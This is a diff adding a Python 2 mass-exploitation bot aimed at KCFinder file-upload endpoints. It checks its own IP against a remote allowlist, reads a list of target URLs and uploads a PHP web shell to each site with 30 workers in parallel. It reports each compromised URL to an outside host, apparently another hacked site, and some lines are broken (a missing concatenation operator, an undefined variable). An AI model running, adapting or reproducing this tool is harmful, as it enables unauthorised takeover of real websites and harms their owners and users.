@@ -1,0 +1,42 @@
+hostname = socket.gethostname()
+IPAddr = socket.gethostbyname(hostname)
+if IPAddr in requests.get('https://raw.githubusercontent.com/boters/PythonBot/master/files/kcfinder.txt').text:
+    Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
+    Target = sys.argv[1]
+    TEXTList = open(Target, 'r').read().splitlines()
+    lists = list((TEXTList))
+
+    class Master:
+        def kcfinder1(self, url):
+            try:
+                              
+                shell = {'Filedata':open('cortex.php5', 'rb'), 'dir':'images'}
+                
+                kencok = url+'?type=images&lng=en&act=upload'
+                sekokan = requests.post(kencok, files=shell,headers=Agent, verify=False)
+                urlkan = kencok.replace('upload.php?type=images&lng=en&act=upload','upload/images/cortex.php5')
+                urlkans = requests.get(urlkan)
+                print urlkan
+                if 'Ghazascanner' in urlkans.text:
+                    print '[Target:]  '+urlkan+'  ==> Success'
+                    urlja = requests.get('https://fommpas.uns.ac.id/wp-includes/css/dist/edit-post/done.php?0='urlkan)
+                    open('resultsx.txt', 'a').write(site+'\n')
+                else:
+                    print '[Target:]  '+url+'  ==> Failed'
+            except:
+                pass
+    BotMaster = Master()
+
+    def Exploit(url):
+        try:
+            site = url
+            BotMaster.kcfinder1(url)
+        except:
+            print 'someone have problem!,check your list!'
+    try:
+        pp = Pool(int('30'))
+        pr = pp.map(Exploit, lists)
+    except:
+        print 'lol'
+else:
+    print 'You Are not my boss,from where you get this bot? \nif want contact ICQ:https://icq.im/greatzcode'
